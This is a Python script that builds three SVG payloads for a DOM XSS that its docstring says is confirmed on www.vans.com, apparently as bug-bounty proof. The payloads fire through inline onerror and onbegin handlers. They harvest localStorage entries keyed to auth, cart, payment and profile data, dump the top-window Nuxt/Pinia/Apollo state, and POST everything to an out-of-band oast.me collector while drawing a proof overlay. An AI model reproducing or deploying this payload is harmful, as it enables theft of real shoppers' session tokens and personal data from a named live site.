#!/usr/bin/env python3
"""
gen_exfil_svg.py -- build the three attacker SVG payloads used by the confirmed
0-click DOM XSS on www.vans.com.

The customizer injects attacker-controlled SVG through innerHTML, so <script>
does NOT run; the payload rides inline event handlers (`onerror` on a broken
<img> and `onbegin` on an SVG <animate>) that the HTML parser DOES execute.

What the payload proves on execution (READ-ONLY, no account mutations):
  (a) harvests every localStorage entry whose key matches
      /auth|cart|favorit|user|pay|loyal|profile|checkout/i  (value truncated to 400 chars)
  (b) reads window.top.__NUXT__ / .state / .data / .pinia  and __pinia/__APOLLO_STATE__
      (same-origin iframe -> full access to the top storefront context)
  (c) renders a fixed, high-z-index overlay titled "XSS EXFILTRATION PROOF"
      listing every harvested key + a value preview (screenshot proof)
  (d) POSTs the same JSON to EXFIL (OOB collector) plus an <img> GET beacon
  (e) keeps window.__XSS_FIRED=true, document.title and the red banner

Usage:
    ./tools/gen_exfil_svg.py                    # use default EXFIL below
    EXFIL=https://x.oast.me/exfil ./tools/gen_exfil_svg.py
"""
import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# OOB collector. The on-page overlay is the PRIMARY proof; this is the
# independent second channel. Static hosts (raw.githubusercontent) cannot log,
# so point this at an interactsh / webhook.site / Burp Collaborator URL, or
# leave a clearly-marked placeholder.
EXFIL = os.environ.get(
    "EXFIL",
    "https://dao24e6635sqh9f6ft7gqsbzb3so471a1.oast.me/exfil",
)

HANDLER = (
    "window.__XSS_FIRED=1;"
    "window.__XSS_DOM=document.domain;"
    "document.title='XSS EXFIL PROOF - '+document.domain;"
    "if(!window.__EXFIL_RAN){window.__EXFIL_RAN=1;(function(){"
    "var EXFIL='__EXFIL__';"
    "var rx=/auth|cart|favorit|user|pay|loyal|profile|checkout/i;"
    "var out={domain:document.domain,href:location.href,ua:navigator.userAgent,"
    "ts:new Date().toISOString(),localStorage:{},lsTotal:0,lsMatched:0,top:{},topPresent:[]};"
    "function S(o,d){d=d||0;if(o===null)return null;var t=typeof o;"
    "if(t==='undefined')return '[undefined]';"
    "if(t==='string')return o.slice(0,400);"
    "if(t==='number'||t==='boolean')return o;"
    "if(t==='function')return '[function]';"
    "if(d>=3)return '[depth]';"
    "var ts=Object.prototype.toString.call(o);"
    "if(ts==='[object Array]'){var a=[],n=Math.min(o.length,40),i;"
    "for(i=0;i<n;i++){try{a.push(S(o[i],d+1))}catch(e){a.push('[err]')}}"
    "if(o.length>n)a.push('...plus'+(o.length-n));return a}"
    "var r={},c=0,k;for(k in o){if(c>=40){r['...plus']='more';break}"
    "try{if(Object.prototype.hasOwnProperty.call(o,k)){r[k]=S(o[k],d+1);c++}}catch(e){}}return r}"
    "try{out.lsTotal=localStorage.length;"
    "for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);"
    "if(rx.test(k)){out.lsMatched++;var v=localStorage.getItem(k);"
    "out.localStorage[k]=v===null?null:String(v).slice(0,400)}}}catch(e){out.lsErr=String(e)}"
    "try{var T=window.top;var pk=['__NUXT__','__pinia','__PINIA__','__NUXT_DATA__','__APOLLO_STATE__'];"
    "for(var p=0;p<pk.length;p++){try{if(T[pk[p]]){out.topPresent.push(pk[p]);out.top[pk[p]]=S(T[pk[p]],0)}}catch(e){}}"
    "var N=T.__NUXT__;if(N){"
    "try{out.top.NUXT_keys=Object.keys(N).slice(0,60)}catch(e){}"
    "try{out.top.NUXT_state=S(N.state,0)}catch(e){}"
    "try{out.top.NUXT_data=S(N.data,0)}catch(e){}"
    "try{out.top.NUXT_pinia=S(N.pinia,0)}catch(e){}}"
    "try{out.top.lsTotal=T.localStorage.length}catch(e){}}catch(e){out.topErr=String(e)}"
    "window.__EXFIL_DATA=out;"
    "function row(tb,k,v){var tr=document.createElement('tr');"
    "var a=document.createElement('td');"
    "a.setAttribute('style','border:1px solid #333;padding:2px 4px;color:#0ff;width:250px;vertical-align:top;word-break:break-all');"
    "a.textContent=k;"
    "var b=document.createElement('td');"
    "b.setAttribute('style','border:1px solid #333;padding:2px 4px;color:#9f9;overflow:hidden;white-space:nowrap;text-overflow:ellipsis');"
    "b.textContent=(v===null)?'null':(typeof v==='object'?JSON.stringify(v):String(v));"
    "tr.appendChild(a);tr.appendChild(b);tb.appendChild(tr)}"
    "function sec(p,title){var t=document.createElement('div');"
    "t.setAttribute('style','font:bold 15px monospace;color:#ff0;margin:9px 0 3px');t.textContent=title;"
    "p.appendChild(t);var tb=document.createElement('table');"
    "tb.setAttribute('style','border-collapse:collapse;width:100%;table-layout:fixed');p.appendChild(tb);return tb}"
    "var host=document.createElement('div');host.id='__xss_exfil';"
    "host.setAttribute('style','position:fixed;z-index:2147483647;top:0;left:0;right:0;max-height:100%;overflow:auto;background:#0b0b0b;color:#0f0;font:13px/1.35 monospace;border-bottom:4px solid #000');"
    "var bar=document.createElement('div');"
    "bar.setAttribute('style','background:#c00;color:#fff;font:bold 20px monospace;padding:8px;text-align:center');"
    "bar.textContent='XSS EXECUTED on '+document.domain;host.appendChild(bar);"
    "var body=document.createElement('div');body.setAttribute('style','padding:10px');host.appendChild(body);"
    "var h1=document.createElement('div');"
    "h1.setAttribute('style','font:bold 18px monospace;color:#ff0');h1.textContent='XSS EXFILTRATION PROOF';body.appendChild(h1);"
    "var meta=document.createElement('div');meta.setAttribute('style','color:#0ff;margin:4px 0 2px');"
    "meta.textContent='domain='+document.domain+'  ts='+out.ts+'  localStorage matched '+out.lsMatched+'/'+out.lsTotal+'  __XSS_FIRED=true';body.appendChild(meta);"
    "var u=document.createElement('div');u.setAttribute('style','color:#888;margin-bottom:4px');u.textContent='url='+location.href;body.appendChild(u);"
    "var ks=Object.keys(out.localStorage);"
    "var tb1=sec(body,'localStorage harvested keys ('+ks.length+')');"
    "for(var i2=0;i2<ks.length;i2++){row(tb1,ks[i2],out.localStorage[ks[i2]])}"
    "if(!ks.length){row(tb1,'(no matching keys)','')}"
    "var tb2=sec(body,'window.top objects present');"
    "row(tb2,'topPresent',out.topPresent);"
    "if(out.top.NUXT_keys)row(tb2,'__NUXT__ top-level keys',out.top.NUXT_keys);"
    "if(out.topErr)row(tb2,'topErr',out.topErr);"
    "if(out.top.NUXT_state){var tb3=sec(body,'window.top.__NUXT__.state (truncated 1200)');"
    "row(tb3,'state',JSON.stringify(out.top.NUXT_state).slice(0,1200))}"
    "if(out.top.NUXT_pinia){var tb4=sec(body,'window.top.__NUXT__.pinia (truncated 1200)');"
    "row(tb4,'pinia',JSON.stringify(out.top.NUXT_pinia).slice(0,1200))}"
    "if(out.top.NUXT_data){var tb5=sec(body,'window.top.__NUXT__.data (truncated 1200)');"
    "row(tb5,'data',JSON.stringify(out.top.NUXT_data).slice(0,1200))}"
    "var f=document.createElement('div');f.setAttribute('style','color:#f88;margin-top:8px');"
    "f.textContent='exfil target: '+EXFIL;body.appendChild(f);"
    "(document.body||document.documentElement).appendChild(host);"
    "try{var pj=JSON.stringify(out);"
    "fetch(EXFIL,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:pj.slice(0,60000)}).catch(function(){});"
    "try{var im=new Image();"
    "im.src=EXFIL+'?d='+encodeURIComponent(document.domain)+'&amp;n='+out.lsMatched+'&amp;k='+encodeURIComponent(ks.join(','))}catch(e){}}catch(e){}"
    "window.__EXFIL_DONE=1;})();}"
).replace("__EXFIL__", EXFIL)

TEMPLATE = (
    '<img src="/{src}" onerror="{h}"/>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="320" height="140">'
    '<animate attributeName="opacity" to="0.5" dur="1s" begin="0s" onbegin="{h}"/>'
    '<rect width="320" height="140" fill="#c00"/>'
    '<text x="12" y="75" fill="#fff" font-size="20">XSS-EXFIL</text>'
    "</svg>"
)

TARGETS = [
    ("evil/svg/customizer/icon-back.svg", "nope-back"),
    ("evil/svg/customizer/icon-close.svg", "nope-close"),
    ("evil/svg/randomizer/sk8-hi/sk8-hi-left-view.svg", "nope-rand"),
]


def main():
    problems = []
    for rel, src in TARGETS:
        svg = TEMPLATE.format(h=HANDLER, src=src)
        checks = {
            "__XSS_FIRED": "window.__XSS_FIRED=1" in svg,
            "localStorage-harvest": "localStorage.getItem(k)" in svg,
            "top-NUXT": "window.top" in svg and "__NUXT__" in svg,
            "overlay-title": "XSS EXFILTRATION PROOF" in svg,
            "red-banner": "XSS EXECUTED on " in svg,
            "exfil-fetch": "fetch(EXFIL" in svg,
            "exfil-beacon": "new Image()" in svg,
            "document.title": "document.title=" in svg,
            "inline-onerror": 'onerror="' in svg,
            "inline-onbegin": "onbegin=" in svg,
            "no-double-quote-in-js": '"' not in HANDLER,
            "exfil-url-baked": EXFIL in svg,
        }
        bad = [k for k, ok in checks.items() if not ok]
        if bad:
            problems.append((rel, bad))
        path = os.path.join(ROOT, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(svg)
        print(f"[+] wrote {rel}  ({len(svg)} bytes)  checks={'OK' if not bad else 'FAIL ' + str(bad)}")

    print(f"[i] EXFIL = {EXFIL}")
    if problems:
        print("[!] FAILED:", problems, file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
